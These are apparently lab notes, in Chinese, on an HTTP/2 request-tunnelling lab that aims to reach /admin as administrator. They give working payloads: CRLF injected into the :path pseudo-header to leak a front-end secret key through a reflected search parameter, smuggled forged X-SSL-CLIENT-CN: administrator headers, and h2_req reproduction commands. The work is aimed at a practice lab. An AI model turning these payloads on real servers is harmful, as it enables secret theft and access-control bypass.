---
title: lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling
---

# lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling

> evidences: [[h2-smuggling-family]]

- 题面:以 administrator 访问 `/admin` 并删 carlos;前端 h2→h1 降级、"fails to adequately sanitize incoming header names"、不复用后端连接(只剩 request tunnelling)。
- 判定:**stuck**(隧道搬运与密钥泄漏稳定可用,但信任位既不可伪造也不可借用)

## 前端追加头块:精确形状与泄漏原语

前端对每个转发请求在客户 `:path` 字节**之后**追加固定块,顺序与原文:
`\r\nHost: <authority>\r\nX-SSL-VERIFIED: 0\r\nX-SSL-CLIENT-CN: null\r\nX-FRONTEND-KEY: <9 位数字>\r\n\r\n`

- **密钥泄漏原语**:外层 `POST /`、`:path` = `/ HTTP/1.1\r\nHost: H\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: <块长+1>\r\n\r\nsearch=` ⇒ 追加块成为 body,搜索页把 `search` 值原样回显,`X-FRONTEND-KEY` 直接读出(截断前即可读全)。
- 块长按 `<authority>` 长度算(authority 59 → 块 149B);本实例取值示例 `X-FRONTEND-KEY: 071876143`(每实例变)。

## 前端头名消毒矩阵

| 注入位置 | 结果 |
| --- | --- |
| 头**值**含 `\r\n` | `RST_STREAM` |
| 头**名**含 `\r\n` | `400 {"error":"Invalid request"}` |
| 头**名**含裸 `\n` | `400 Newlines in headers are not allowed` |
| 头**名**含空格/制表 | 放行(未归一化,但不越权) |
| **`:path` 含 CRLF** | 放行且原样写进 h1 ⇒ 唯一注入面 |

## 重复信任头 = 后出现者胜

- 经 `:path` 请求行注入**精确名** `X-SSL-VERIFIED: 1` + `X-SSL-CLIENT-CN: administrator` + **泄漏到的正确** `X-FRONTEND-KEY` 直打 `/admin` ⇒ 仍 **401/2776**。
- 同样的三行塞进内层块(收尾/不收尾)⇒ 仍 **401**。
- 再用客户端 `Content-Length: 140` 把前端追加块吸成请求 body ⇒ 仍 **401**(与「追加块整块变 body」应有的 200 相反)。
- ⇒ 客户端自带的证书头/密钥行**不生效**:同名头取后出现者(前端追加的 `0`/`null`),或 `/admin` 的判据是会话角色而非这三行。**信任位不可伪造/不可借用,记死。**

## 隧道与内层读取(读通道确认)

- 形状:外层 `HEAD <path>` + `:path` 注入**未收尾**的内层请求(最后一行为 `X: ` 之类头名,让模板的 ` HTTP/1.1` 与之拼接)。h2 流的 **status/headers 是外层请求的**(如 `/admin` → 401/2776),而 **body 是内层请求的原始响应**:实测外层 `HEAD /admin` + 内层 `GET /` ⇒ body 为 `HTTP/1.1 200 OK … Content-Length: 8854` 的首页原文。⇒ **内层响应可读,前提是内层头块不收尾**。
- **收尾**的内层请求(自带 `\r\n\r\n`)不被回读:外层 `POST /x` 注内层 `GET /admin`(收尾)只回外层 `"Not Found"`,与「不收尾才可读」一致。
- 内层是 `POST /` + 未闭合 `search=` 时,追加块成为它的 body,搜索页回显 ⇒ **`X-FRONTEND-KEY` 可读**。

## 复现命令

```
http_dump <inst>/admin                                   # 基线 401,CL 2776
h2_req <inst>/ --method POST --path '/ HTTP/1.1\r\nHost: <H>\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 150\r\n\r\nsearch=' --read-ms 5000   # 泄漏 X-FRONTEND-KEY
h2_req <inst>/ --method GET --path '/admin HTTP/1.1\r\nHost: <H>\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\nX-FRONTEND-KEY: <k>\r\nX-Pad: ' --read-ms 5000   # 请求行注入 ⇒ 401
```

## 背端全景枚举与决定性否证

- 读通道用于路由枚举(内层原文可读):`/` = 200(8854)、`/login` = 200(3351,普通登录表单)、`/robots.txt` = 404、`/admin` = 401(2776)。背端与前端是同一 app,无独立管理入口。
- **决定性**:把前端追加块用 `Content-Length` 吸成 body(外层 `GET /admin` 请求行注入 `X-SSL-VERIFIED: 1`+`X-SSL-CLIENT-CN: administrator`+正确 key + `\r\n\r\n` + `Content-Length: 140`),使背端只看到**我们自带的**三行 ⇒ `/admin` 仍 **401/2776** ⇒ 背端**不采信客户端自带的证书/密钥头**,信任位只来自前端追加。
- 以精确大小写经普通 h2 头(`--hdr2 'X-SSL-VERIFIED||1'`)直打 `/admin` ⇒ 仍 401(重复名不翻转)。走私 `GET /admin/delete?username=carlos`(同形)后横幅仍 not solved。

## 关系

- 族:[[h2-smuggling-family]];方法见 [[h2-tunnelling-and-h2cl-practice]]、[[h2-frontend-sanitizer-matrix]]。
